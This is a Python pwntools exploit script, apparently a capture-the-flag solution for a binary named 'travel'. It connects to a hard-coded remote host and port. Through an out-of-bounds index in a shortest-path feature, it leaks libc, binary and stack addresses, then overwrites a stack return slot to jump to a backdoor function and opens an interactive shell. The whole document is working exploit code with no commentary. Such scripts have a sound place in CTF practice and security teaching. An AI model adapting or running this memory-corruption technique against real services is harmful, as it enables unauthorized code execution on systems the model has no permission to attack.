#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 0
if local:
    p = process('./travel')
    elf = ELF('./travel')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('124.16.75.162', 31057)
    elf = ELF('./travel')
    libc = ELF('./libc-2.23.so')

# set times
p.sendlineafter('>> ', '4')

# leak libc & binary
def leak(offset):
    p.sendlineafter('>> ', '10000')
    p.sendlineafter('>> ', '1') # roads
    p.recvuntil('[from] [to] [distant]\n')
    p.sendline('1 2 3')
    p.sendlineafter('>> ', '1')
    p.sendlineafter('>> ', str(offset))
    p.recvuntil('the length of the shortest path is ')
    return int(p.recvuntil('\n')[:-1])

io_stdout = leak(-0x8db) # leak `_IO_2_1_stdout_`
libc_base = io_stdout - libc.sym['_IO_2_1_stdout_']
info('libc_base = ' + hex(libc_base))
binary_base = leak(-0x8e6) - 0x2051a8
info('binary_base = ' + hex(binary_base))
#gdb.attach(p, 'b *$rebase(0x0000000000001031)\nc')

# leak stack
dist_addr = binary_base + 0x0000000000209960
environ = libc_base + libc.sym['environ']
info('environ = ' + hex(environ))
stack = leak((environ - dist_addr) / 8)
info('stack = ' + hex(stack))
target = stack - 0xf0
info('target = ' + hex(target))

# call backdoor
backdoor = binary_base + 0x0000000000001367
offset = (target - dist_addr) / 8
info('offset = ' + hex(offset))
p.sendlineafter('>> ', '500')
p.sendlineafter('>> ', '1') # roads
p.recvuntil('[from] [to] [distant]\n')
#gdb.attach(p, 'b *$rebase(0x00000000000011F6)\nb *$rebase(0x0000000000001237)\nc')
p.sendline('10 ' + str(offset) + ' ' + str(backdoor))
p.sendlineafter('>> ', '10')
#gdb.attach(p, 'b *$rebase(0x00000000000017D8)\nc')
p.sendlineafter('>> ', 100 * '10')

#gdb.attach(p)

p.interactive()

